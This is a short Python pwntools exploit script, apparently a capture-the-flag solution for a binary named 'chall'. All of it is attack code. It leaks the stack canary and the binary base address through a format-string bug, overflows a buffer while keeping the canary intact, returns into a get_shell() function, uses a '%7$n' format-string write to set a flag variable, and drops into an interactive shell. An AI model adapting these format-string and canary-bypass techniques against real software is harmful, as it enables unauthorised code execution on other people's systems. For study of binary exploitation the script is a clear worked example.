#!/usr/bin/python3
from pwn import process, p64

shell = process("./chall")

offset = 104
junk = b"A" * offset

shell.sendlineafter(b":\n", b"%p.%19$p")
leak = shell.recvline().strip().decode().split(".")

canary = int(leak[1], 16)
binary_base = int(leak[0], 16) - 0x2061

payload  = b""
payload += junk
payload += p64(canary)
payload += b"B" * 8                  # rbp value
payload += p64(binary_base + 0x101a) # ret;
payload += p64(binary_base + 0x125c) # get_shell()

shell.sendlineafter(b":\n", payload)

payload  = b""
payload += b"..%7$n.."               # overwrite
payload += p64(binary_base + 0x401c) # can_leave

shell.sendlineafter(b":\n", payload)
shell.sendlineafter(b':\n', b'--')

shell.interactive()
